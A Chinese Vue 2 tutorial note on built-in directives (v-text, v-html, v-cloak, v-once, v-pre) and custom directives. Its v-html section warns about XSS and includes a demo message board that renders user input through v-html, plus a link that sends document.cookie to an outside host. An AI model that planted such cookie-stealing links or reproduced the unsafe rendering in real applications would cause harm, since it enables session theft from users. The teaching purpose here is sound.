---
title: ".13、Vue的常用指令与自定义指令》"
slug: "vue-vue2-13-vue-78e23a80"
summary: ""
category: "vue2"
tags: []
status: "draft"
sortOrder: 130
cover: ""
originalId: "6a2d291e8a2b1c68f2cac2ae"
originalSlug: "vue-vue2-13-vue-78e23a80"
originalStatus: "published"
exportedAt: "2026-07-30T14:46:52.260Z"
---
# Vue的常用指令与自定义指令
## 2.13.1 v-text
+ **功能**：将内容填充到标签体中，以覆盖的形式填充。填充的内容即使包含HTML标签，也会被当作普通字符串处理，不会解析。功能等同于原生JS中的`innerText`。

## 2.13.2 v-html
+ **功能**：将内容填充到标签体中，并以覆盖的形式填充。填充的内容会被当作HTML代码解析。功能等同于原生JS中的`innerHTML`。
+ **注意**：不要用在用户提交的内容上，可能会导致XSS攻击。

### XSS攻击示例
XSS攻击通常指通过利用网页开发时留下的漏洞，注入恶意代码到网页中，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript。

例如，用户在留言中恶意植入以下信息：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Document</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2.7.16/dist/vue.js"></script>
</head>
<body>
    <!-- 需求：简易版的留言板，并将留言进行展示 -->
    <div id="app">
        <h1>{{msg}},test</h1>
        <ul>
            <li>
                <a href='javascript:location.href="http://www.baidu.com/?cookie?"+document.cookie'>点我给你看点好玩的</a>
            </li>
            <li v-for="(item,index) of myList" v-html="item" :key="index"></li>
        </ul>
        <textarea cols="30" rows="10" v-model.lazy="list"></textarea>
        <button @click="send">提交</button>
    </div>
    <script>
        const vm = new Vue({
            data() {
                return {
                    msg: "模拟xss攻击",
                    myList: [],
                    list: "",
                };
            },
            methods: {
                send() {
                    this.myList.push(this.list);
                },
            },
        }).$mount("#app");
    </script>
</body>
</html>

```

## 2.13.3 v-cloak
+ **功能**：通过配置CSS样式解决“胡子”（`{{ }}`）的闪现问题。
+ **实现**：使用`v-cloak`指令标记标签，Vue实例接管后会删除该指令。
+ **CSS样式**：

```css
[v-cloak] {
    display: none;
}
```

### 示例代码
```html
<head>
    <meta charset="UTF-8">
    <title>Vue的其它指令</title>
    <style>
        [v-cloak] {
            display: none;
        }
    </style>
</head>
<body>
    <div id="app">
        <h1 v-cloak>{{msg}}</h1>
    </div>
    <script>
        // 晚3s引入vue.js
        setTimeout(() => {
            let scriptElt = document.createElement("script");
            scriptElt.src = "./js/vue.js";
            document.head.append(scriptElt);
        }, 3000);

        // 晚4s创建vm实例
        setTimeout(() => {
            const vm = new Vue({
                el: "#app",
                data: {
                    msg: "Vue的其它指令",
                },
            });
        }, 4000);
    </script>
</body>

```

## 2.13.4 v-once
+ **功能**：只渲染一次。之后将被视为静态内容。

## 2.13.5 v-pre
+ **功能**：使用该指令可以提高编译速度。带有该指令的标签将不会被编译。可以在没有Vue语法规则的标签中使用，以提高效率。不要将它用在带有指令语法以及插值语法的标签中。

### 示例代码
```html
<body>
    <div id="app">
        <h1 v-cloak>{{msg}}</h1>
        <!-- v-pre 不参与vue编译，提高效率 -->
        <h1 v-pre>欢迎学习Vue框架！</h1>
        <!-- v-once 只执行一次，视为静态页面 -->
        <h2 v-once>{{num}}</h2>
        <button @click="num++">点我+1</button><br>
    </div>
    <script>
        const vm = new Vue({
            el: "#app",
            data: {
                msg: "Vue的其它指令",
                num: 0
            },
        });
    </script>
</body>

```

## 2.13.6 自定义指令
### 2.13.6.1 局部自定义指令
#### 1. 函数式
```html
<body>
    <div id="app">
        <h1>自定义指令</h1>
        <!-- 需求1：自定义v-text-danger指令，将msg文字变红放入到div中 -->
        <div v-text="msg"></div>
        <div v-text-danger="msg"></div>
    </div>
    <script>
        const vm = new Vue({
            el: "#app",
            data: {
                msg: "自定义指令",
                username: "jackson",
            },
            // 配置自定义指令
            directives: {
                // 写法一：函数式
                'text-danger': function(element, binding) {
                    console.log('@');
                    element.innerText = binding.value;
                    element.style.color = 'red';
                },
                // 需求2：自定义一个指令，可以和v-bind指令完成相同的功能，同时将该元素的父级元素的背景色设置为蓝色
                'bind-blue': function(element, binding) {
                    element.value = binding.value;
                    console.log(element);
                    console.log(element.parentNode);
                    element.parentNode.style.backgroundColor = 'blue';
                }
            }
        });
    </script>
</body>

```

#### 2. 对象式
```html
<body>
    <div id="app">
        <!-- 需求2: 自定义一个指令，可以和v-bind指令完成相同的功能，同时将该元素的父级元素的背景色设置为蓝色 -->
        v-bind：用户名：<input type="text" v-bind:value="username" />
        v-bind-blue：用户名：<input type="text" v-bind-blue="username" />
    </div>
    <script>
        const vm = new Vue({
            el: "#app",
            data: {
                msg: "自定义指令",
                username: "jackson",
            },
            // 配置自定义指令
            directives: {
                // 写法二：对象式
                'bind-blue': {
                    bind(element, binding) {
                        element.value = binding.value;
                    },
                    inserted(element, binding) {
                        element.parentNode.style.backgroundColor = 'blue';
                    },
                    update(element, binding) {
                        element.value = binding.value;
                    }
                }
            }
        });
    </script>
</body>

```

### 2.13.6.2 全局自定义指令
```html
<body>
    <div id="app">
        <h1>自定义指令</h1>
        <div v-text="msg"></div>
        <div v-text-danger="msg"></div>
        v-bind：用户名：<input type="text" v-bind:value="username" /><br>
        <div>v-bind-blue：用户名：<input type="text" v-bind-blue="username" /></div>
    </div>
    <hr>
    <div id="app2">
        <div v-text-danger="msg"></div>
        <div>用户名：<input type="text" v-bind-blue="username" /></div>
    </div>
    <script>
        // 定义全局的指令
        // 函数式
        Vue.directive("text-danger", function(element, binding) {
            console.log(this);
            element.innerText = binding.value;
            element.style.color = "red";
        });

        // 对象式
        Vue.directive("bind-blue", {
            bind(element, binding) {
                element.value = binding.value;
                console.log(this);
            },
            inserted(element, binding) {
                element.parentNode.style.backgroundColor = "skyblue";
                console.log(this);
            },
            update(element, binding) {
                element.value = binding.value;
                console.log(this);
            }
        });

        const vm2 = new Vue({
            el: "#app2",
            data: {
                msg: "欢迎学习Vue框架！",
                username: "lucy",
            },
        });

        const vm = new Vue({
            el: "#app",
            data: {
                msg: "欢迎学习Vue框架！",
                username: "jack",
            },
        });
    </script>
</body>

```
